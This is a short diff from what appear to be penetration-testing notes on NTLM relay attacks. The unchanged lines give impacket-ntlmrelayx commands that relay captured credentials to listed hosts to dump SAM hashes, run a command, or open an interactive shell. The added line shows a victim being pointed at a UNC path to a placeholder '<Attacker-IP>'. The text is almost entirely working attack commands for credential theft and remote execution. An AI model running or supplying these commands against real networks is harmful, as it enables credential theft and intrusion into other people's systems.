@@ -87,7 +87,7 @@ impacket-ntlmrelayx -tf targets.txt -smb2support #dumphash
 impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami" #command
 impacket-ntlmrelayx -tf targets.txt -smb2support -i #interactive terminal
 
-#point victum machine to attacker machine somehow ,
+#point victum machine to attacker machine somehow , like //<Attacker-IP>
 
 #impacket script relay to targets.txt hosts , if the captured credentials have #valid account in relayed hosts with "Administrative privileges" then we dump #sam local hash or perform other action.
 
